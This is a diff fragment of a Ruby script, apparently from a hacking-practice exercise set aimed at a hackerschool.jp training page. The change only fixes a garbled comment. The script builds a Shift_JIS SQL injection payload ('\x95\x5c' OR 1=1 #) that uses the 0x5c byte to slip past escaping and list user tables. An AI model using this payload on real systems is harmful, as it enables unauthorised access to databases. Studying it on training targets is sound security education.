@@ -3,7 +3,7 @@ require_relative 'hack_utils'
 require 'net/http'
 
 # ShiftJIS 0x5c problem
-# display user tables using SQL injection with ShiftJIS '•\'
+# display user tables using SQL injection with ShiftJIS 'è¡¨'
 id ="\x95\x5c' OR 1=1 #"
 id.force_encoding('shift_jis')
 url = 'http://www.hackerschool.jp/hack/take10.php'
